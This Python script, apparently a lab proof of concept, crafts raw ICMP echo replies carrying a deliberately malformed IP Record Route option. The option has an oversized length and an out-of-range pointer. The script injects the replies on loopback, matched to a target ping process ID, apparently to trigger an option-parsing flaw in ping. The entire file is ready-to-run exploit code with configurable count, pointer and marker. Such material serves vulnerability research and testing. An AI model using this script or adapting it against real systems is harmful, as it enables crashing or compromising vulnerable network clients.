#!/usr/bin/env python3
"""Inject crafted ICMP echo replies with a malformed IP Record Route option
into the loopback interface.  Lab-only: 127.0.0.2 -> 127.0.0.1, AF_PACKET on lo.
"""
import argparse
import socket
import struct
import sys
import time


def csum(data):
    if len(data) & 1:
        data += b"\0"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def frame(pid, rr_len, ptr, marker, payload_len=64):
    ident = pid & 0xFFFF
    icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", ident) + struct.pack("!H", 0)
    icmp += marker * (payload_len // len(marker))
    icmp = icmp[:payload_len + 8]
    icmp = icmp[:2] + struct.pack("!H", csum(icmp)) + icmp[4:]

    opts = bytes([7, rr_len & 0xFF, ptr & 0xFF]) + marker * ((40 - 3) // len(marker))
    opts = (opts + b"\0" * 40)[:40]
    total_len = 20 + len(opts) + len(icmp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x4F, 0, total_len, 0x1234, 0, 64, 1, 0,
                     socket.inet_aton("127.0.0.2"), socket.inet_aton("127.0.0.1"))
    ip += opts
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    eth = b"\x00\x11\x22\x33\x44\x55" * 2  # 12 dst/src bytes
    return eth + b"\x08\x00" + ip + icmp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=0x48)
    ap.add_argument("--marker", default="OMIS")
    ap.add_argument("--count", type=int, default=20)
    ap.add_argument("--gap", type=float, default=0.05)
    ap.add_argument("--mode", choices=("packet", "ip"), default="ip")
    a = ap.parse_args()
    marker = a.marker.encode()
    wire = frame(a.pid, a.rr_len, a.ptr, marker)
    payload = wire[14:] if a.mode == "ip" else wire
    if a.mode == "ip":
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    else:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind(("lo", 0, socket.htons(0x0003)))
    try:
        for _ in range(a.count):
            s.sendto(payload, ("127.0.0.1", 0)) if a.mode == "ip" else s.send(payload)
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d frames: mode=%s rr_len=%d ptr=0x%02x pid=%d" %
          (a.count, a.mode, a.rr_len, a.ptr, a.pid))


if __name__ == "__main__":
    sys.exit(main())
